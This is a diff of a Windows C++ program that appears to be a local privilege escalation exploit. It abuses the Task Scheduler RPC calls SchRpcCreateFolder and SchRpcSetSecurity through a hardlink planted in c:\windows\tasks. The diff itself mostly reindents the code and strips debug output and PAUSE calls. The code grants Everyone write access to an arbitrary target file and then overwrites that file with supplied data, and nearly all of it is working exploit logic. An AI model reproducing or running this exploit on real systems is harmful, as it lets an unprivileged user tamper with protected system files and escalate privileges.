@@ -71,58 +71,49 @@ int wmain(int argc, wchar_t *argv[])
 		return E_INVALIDARG;
 	}
 
-    wchar_t jobName[32];
-    wchar_t jobPath[64];
+	wchar_t jobName[32];
+	wchar_t jobPath[64];
 
-    wsprintf(jobName, L"SystemCopy-%x", time(nullptr));
-    wsprintf(jobPath, L"c:\\windows\\tasks\\%ws.job", jobName);
+	wsprintf(jobName, L"SystemCopy-%x", time(nullptr));
+	wsprintf(jobPath, L"c:\\windows\\tasks\\%ws.job", jobName);
 
-    // Create Hardlink
-    printf("Create hardling : '%ws' -> '%ws'\n", jobPath, argv[2]);
+	// Create Hardlink
+	printf("Create hardling : '%ws' -> '%ws'\n", jobPath, argv[2]);
 	if (!CreateNativeHardlink(jobPath, argv[2]))
-    {
-        fprintf(stderr, "ERROR : Can't create hardlink, '%ws' need to be unlocked and readable by the current user.\n", argv[2]);
-        return -1;
-    }
+	{
+		fprintf(stderr, "ERROR : Can't create hardlink, '%ws' need to be unlocked and readable by the current user.\n", argv[2]);
+		return -1;
+	}
 
-    // Create RPC binding handle
+	// Create RPC binding handle
 	RPC_BINDING_HANDLE handle;
 	CreateBindingHandle(&handle);
 
-    // Try to set write privilege to "everyone" on the dstFile (using the hardlink, will work only on vulnerable systems)
-    printf("Set write privilege for 'EVERYONE' on '%ws'\n", argv[2]);
+	// Try to set write privilege to "everyone" on the dstFile (using the hardlink, will work only on vulnerable systems)
+	printf("Set write privilege for 'EVERYONE' on '%ws'\n", argv[2]);
 	HRESULT r1 = _SchRpcCreateFolder(handle, jobName, L"D:(A;;0x1301bf;;;WD)(A;OICIIO;SDGXGWGR;;;WD)", 0);
-	printf("%x\n", r1);
 	HRESULT r2 = _SchRpcSetSecurity(handle, jobName, L"D:(A;;0x1301bf;;;WD)(A;OICIIO;SDGXGWGR;;;WD)", 0);
-	printf("%x\n", r2);
 
-    /*if (r1 != 0 && r2 != 0)
-    {
-        fprintf(stderr, "ERROR : Can't set privileges, '%ws' need to be writable by the 'system' user and the OS must be vulnerable.\n", argv[2]);
-        return -2;
-    }*/
+	printf("Copy data from '%ws' to '%ws'...\n", argv[1], argv[2]);
+	// Try to open the dstFile (will success only if the previous step has worked)
+	HANDLE hDst = CreateFile(argv[2], GENERIC_WRITE, 0, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hDst == INVALID_HANDLE_VALUE)
+	{
+		fprintf(stderr, "ERROR : Can't open dstFile, '%ws' may be locked or unwritable by the 'system' user or the system may be unusable.\n", argv[2]);
+		return -3;
+	}
 
-    printf("Copy data from '%ws' to '%ws'...\n", argv[1], argv[2]);
-    // Try to open the dstFile (will success only if the previous step has worked)
-    HANDLE hDst = CreateFile(argv[2], GENERIC_WRITE, 0, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hDst == INVALID_HANDLE_VALUE)
-    {
-        fprintf(stderr, "ERROR : Can't open dstFile, '%ws' may be locked or unwritable by the 'system' user or the system may be unusable.\n", argv[2]);
-        return -3;
-    }
-
-    // Open the srcFile
+	// Open the srcFile
 	HANDLE hSrc = CreateFile(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hSrc == INVALID_HANDLE_VALUE)
 	{
 		fprintf(stderr, "ERROR : Can't open srcFile : %ws\n", argv[1]);
-		system("PAUSE");
 		return -4;
 	}
 
-    DWORD len = 0;
+	DWORD len = 0;
 	char buf[BUFSIZE] = { 0 };
-    // Copy data from srcFile to dstFile
+	// Copy data from srcFile to dstFile
 	do {
 		ReadFile(hSrc, buf, BUFSIZE, &len, nullptr);
 		WriteFile(hDst, buf, len, &len, nullptr);
@@ -132,7 +123,6 @@ int wmain(int argc, wchar_t *argv[])
 	CloseHandle(hDst);
 
 	puts("Done\n");
-	system("PAUSE");
 
 	return 0;
 }
